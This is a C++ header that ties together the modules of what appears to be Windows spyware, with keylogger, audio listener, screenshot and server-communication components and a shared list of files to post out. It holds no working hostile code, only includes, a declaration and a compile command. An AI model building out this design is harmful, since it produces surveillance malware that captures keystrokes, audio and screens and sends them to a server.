#ifndef HEADER_LINKING
#define HEADER_LINKING

// Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp web/*.cpp screenshots/*.cpp -lwinmm -lws2_32 -lgdi32

#include <iostream>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <WinSock2.h>
#include <mmsystem.h>
#include <lmcons.h>
#include <string>
#include <vector>
#include <cmath>
#include <climits>
#include <ctime>
#include <atomic>

extern std::atomic<std::string *>filesToPostSend;

#include "audioListener.hpp"
#include "bufferAnalysis.hpp"
#include "threadForAudio.hpp"
#include "keylogger.hpp"
#include "threads.hpp"
#include "serverComs.hpp"
#include "screenshot.hpp"

#endif